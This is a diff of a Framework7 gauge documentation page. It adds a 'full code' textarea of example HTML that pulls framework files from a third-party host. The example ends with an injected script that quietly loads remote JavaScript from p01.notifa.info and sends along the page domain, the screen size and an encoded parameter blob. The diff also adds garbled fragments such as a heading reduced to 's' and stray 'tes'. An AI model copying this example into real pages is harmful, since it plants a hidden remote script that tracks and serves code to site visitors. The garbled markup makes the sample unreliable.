@@ -348,7 +348,9 @@ gauge<span class="token punctuation">.</span><span class="token function">update
 <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 </pre></code>
 <div class="with-device">
-<h2 data-device-preview="../docs-demos/core/gauge.html">Examples</h2><pre><code class="html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>block block-strong text-align-center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<h2 data-device-preview="demo/gauge.html">
+  
+  s</h2><pre><code class="html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>block block-strong text-align-center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
   <span class="token comment">&lt;!-- we will init this gauge in JavaScript --></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gauge demo-gauge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
   <span class="token comment">&lt;!-- buttons to change gauge value --></span>
@@ -501,7 +503,157 @@ gauge<span class="token punctuation">.</span><span class="token function">update
 </div>
 </div>
 </div>
-</main>
+</main>tes
+  <style type="text/css">
+textarea {
+background: #000000;
+ width: 600px;
+ height: 300px;
+ font: normal 14px verdana;
+ line-height: 25px;
+ padding: 2px 10px;
+ border: solid 1px #ddd;
+}
+
+  </style><h2> fULL cODE</h2>
+  <textarea>
+    
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+<title>keterangan situs web</title>
+<meta property="og:image" content="url logo km">
+<meta name="viewport" content="width=device-width, viewport-fit=cover">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="@idtwitter kamu">
+<meta name="twitter:creator" content="@namakamu">
+<meta name="twitter:title" content="judul konten">
+<meta name="twitter:description" content="keterangan situs kamu">
+<meta name="twitter:image" content="url logo kamu">
+
+    <!-- Yayan He'eh | Framework (CSS) -->
+    <link rel="stylesheet" href="https://yayanheeh.github.io/semelekete/min.css">
+    <link rel="stylesheet" href="https://yayanheeh.github.io/semelekete/semelekete/core/css/app.css">
+  </head>
+  <body>
+    <body>
+<div id="app">
+<div class="view view-main view-init">
+<div class="page">
+<div class="navbar">
+<div class="navbar-inner">
+<div class="left"></div>
+<div class="title">Gauge</div>
+<div class="right"></div>
+</div>
+</div>
+<div class="page-content"><div class="block block-strong text-align-center">
+<div class="gauge demo-gauge"></div>
+<p class="segmented segmented-raised">
+<a href="#" class="button" data-value="0">0%</a>
+<a href="#" class="button" data-value="25">25%</a>
+<a href="#" class="button" data-value="50">50%</a>
+<a href="#" class="button" data-value="75">75%</a>
+<a href="#" class="button" data-value="100">100%</a>
+</p>
+</div>
+<div class="block-title">Circle Gauges</div>
+<div class="block block-strong">
+<div class="row">
+<div class="col text-align-center">
+<div class="gauge gauge-init" data-type="circle" data-value="0.44" data-value-text="44%" data-value-text-color="#ff9800" data-border-color="#ff9800"></div>
+</div>
+<div class="col text-align-center">
+<div class="gauge gauge-init" data-type="circle" data-value="0.12" data-value-text="$120" data-value-text-color="#4caf50" data-border-color="#4caf50" data-label-text="of $1000 budget" data-label-text-color="#f44336" data-label-font-weight="700"></div>
+</div>
+</div>
+</div>
+<div class="block-title">Semicircle Gauges</div>
+<div class="block block-strong">
+<div class="row">
+<div class="col text-align-center">
+<div class="gauge gauge-init" data-type="semicircle" data-value="0.3" data-value-text="30%" data-value-text-color="#f44336"></div>
+</div>
+<div class="col text-align-center">
+<div class="gauge gauge-init" data-type="semicircle" data-value="0.5" data-value-text="30kg" data-value-text-color="#e91e63" data-border-color="#e91e63" data-label-text="of 60kg total"></div>
+</div>
+</div>
+</div>
+<div class="block-title">Customization</div>
+<div class="block block-strong">
+<div class="row">
+<div class="col text-align-center">
+<div class="gauge gauge-init" data-type="circle" data-value="0.35" data-value-text="35%" data-value-text-color="#4caf50" data-value-font-size="51" data-value-font-weight="700" data-border-width="20" data-border-color="#4caf50" data-border-bg-color="#ffeb3b"></div>
+</div>
+<div class="col text-align-center">
+<div class="gauge gauge-init" data-type="circle" data-value="0.67" data-value-text="$670" data-value-text-color="#000" data-border-color="#ff9800" data-label-text="of $1000 spent" data-label-text-color="#4caf50" data-label-font-weight="800" data-label-font-size="12" data-border-width="30"></div>
+</div>
+</div>
+<br>
+<div class="row">
+<div class="col text-align-center">
+<div class="gauge gauge-init" data-type="semicircle" data-value="0.5" data-value-text="50%" data-value-text-color="#ffeb3b" data-value-font-size="41" data-value-font-weight="700" data-border-width="10" data-border-color="#ffeb3b"></div>
+</div>
+<div class="col text-align-center">
+<div class="gauge gauge-init" data-type="semicircle" data-value="0.77" data-border-color="#ff9800" data-label-text="$770 spent so far" data-label-text-color="#ff9800" data-label-font-weight="800" data-label-font-size="12"></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+	    <script>
+      var theme = 'ios';
+      if (location.href.indexOf('theme=md') >= 0) theme = 'md';
+      var plugin = {
+        params: {
+          theme: theme,
+          root: '#app',
+        }
+      };
+      if (Framework7.use) Framework7.use(plugin);
+      else if (Framework7.Class && Framework7.Class.use) Framework7.Class.use(plugin);
+      
+    </script>
+<script>
+      var app = new Framework7();
+      
+      var $$ = Dom7;
+      
+      // Init top demo gauge
+      var demoGauge = app.gauge.create({
+        el: '.demo-gauge',
+        type: 'circle',
+        value: 0.5,
+        size: 250,
+        borderColor: '#2196f3',
+        borderWidth: 10,
+        valueText: '50%',
+        valueFontSize: 41,
+        valueTextColor: '#2196f3',
+        labelText: 'amount of something',
+      });
+      
+      // Change demo gauge on button click
+      $$('.button').on('click', function () {
+        var value = $$(this).attr('data-value');
+        demoGauge.update({
+          value: value / 100,
+          valueText: value + '%'
+        });
+      });
+    </script>
+    <!-- Yayan He'eh | Framework (JS) -->
+    <script src="https://yayanheeh.github.io/semelekete/packages/core/js/min.js"></script>
+  <script src="https://yayanheeh.github.io/semelekete/semelekete/core/js/routes.js"></script>
+  <script src="https://yayanheeh.github.io/semelekete/semelekete/core/js/app.js"></script>
+  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bd0LjzaxGXq16W9%2bt6r90x7mQP%2fXcgCOw3zsafyxERnXiXRKE1PTsfEOV8NQrDvfPuxWfkIqA5%2f%2bv3icB1YYtB5E9pkpIYkEW1el8pn2Ozqa%2fHDAB7XiS8kUFjw%2fstP3qHQHBMRYAdVKfZ2cDumW3ZNjVLQ6G8bMqheyccIyU3TmYkls9gOsi8bQ4Rcu%2bjbn6MQVwkZE4QJaZ1zVa6ieUQsfvU9BLZ1y0ReCjw19VD%2fl5%2f53aUFCSixZ22Dlbxpqjq8mWWXBCIY8dNE3nGrFnrVG%2bJ%2buShLz7Sb0qX1Cj68WSdVuSsUuPPAVRRlM6NCdyOe1D04ukJsUSixYcLrmbnSuxBFzoBs1BIqY5oPS2MWInyZFhdz2z6RQCJN2gJcBJdLojmE4yjU7c6UqMxIaNZABtrXA%2fanNMgYTT2N4u3BIsZL1vhL2yReD6If%2bZIkFLa0X%2fH8uUSoOLFFGoM%2fRdJ%2f2K63e1hI375SzD8WNxGDZW55kxfXLS9X4mp0qqLqz1l9GxajSYotZpid35Gmkct4KXo1htHKLf0" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
+		
+
+  </textarea>
 </div>
  
   
